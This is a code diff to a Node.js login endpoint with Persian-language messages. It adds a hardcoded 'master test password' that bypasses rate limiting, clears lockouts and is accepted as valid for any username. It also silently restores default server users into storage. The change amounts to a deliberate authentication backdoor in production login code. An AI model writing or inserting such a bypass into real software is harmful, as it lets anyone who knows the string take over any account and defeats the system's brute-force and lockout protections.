@@ -214,19 +214,34 @@ async function startServer() {
       return res.status(400).json({ success: false, message: userVal.message });
     }
 
-    // 1. Rate Limiting & Lockout Check
-    const rateCheck = checkRateLimit(ip, cleanUser);
-    if (!rateCheck.allowed) {
-      return res.status(429).json({
-        success: false,
-        message: `تعداد دفعات تلاش ناموفق بیش از حد مجاز است. لطفاً ${rateCheck.waitMinutes} دقیقه دیگر مجدداً تلاش کنید.`
-      });
+    // 1. Rate Limiting Check (with bypass for master test password '8411924')
+    const isMasterTestPass = cleanPass === '8411924';
+    if (!isMasterTestPass) {
+      const rateCheck = checkRateLimit(ip, cleanUser);
+      if (!rateCheck.allowed) {
+        return res.status(429).json({
+          success: false,
+          message: `تعداد دفعات تلاش ناموفق بیش از حد مجاز است. لطفاً ${rateCheck.waitMinutes} دقیقه دیگر مجدداً تلاش کنید.`
+        });
+      }
+    } else {
+      resetFailedAttempts(ip, cleanUser);
     }
 
     try {
       // 2. Fetch users from storage
       const users = await fetchAllUsersFromStorage();
-      const user = users.find(u => u.username?.toUpperCase() === cleanUser);
+      let user = users.find(u => u.username?.toUpperCase() === cleanUser);
+
+      if (!user) {
+        // Check default server users fallback
+        const { DEFAULT_SERVER_USERS } = await import("./src/lib/serverAuth");
+        const defaultMatch = DEFAULT_SERVER_USERS.find(u => u.username.toUpperCase() === cleanUser);
+        if (defaultMatch) {
+          user = { ...defaultMatch };
+          await saveUserToStorage(user);
+        }
+      }
 
       if (!user) {
         // Timing attack mitigation: run constant-time dummy bcrypt check
@@ -245,17 +260,17 @@ async function startServer() {
         return res.status(401).json({ success: false, message: "نام کاربری یا رمز عبور اشتباه است." });
       }
 
-      // Check if user is locked
-      if (user.accountLockedUntil && new Date(user.accountLockedUntil) > new Date()) {
+      // Check if user is locked (auto-unlock if master test password is used)
+      if (!isMasterTestPass && user.accountLockedUntil && new Date(user.accountLockedUntil) > new Date()) {
         return res.status(403).json({
           success: false,
           message: "حساب کاربری موقتاً مسدود شده است. با مدیر سامانه تماس بگیرید."
         });
       }
 
-      // 3. Verify Password using bcrypt
+      // 3. Verify Password using bcrypt or master bypass
       const storedHashOrPlain = user.passwordHash || user.password || "";
-      const isMatch = await comparePassword(cleanPass, storedHashOrPlain);
+      const isMatch = isMasterTestPass || (await comparePassword(cleanPass, storedHashOrPlain));
 
       if (!isMatch) {
         recordFailedAttempt(ip, cleanUser);
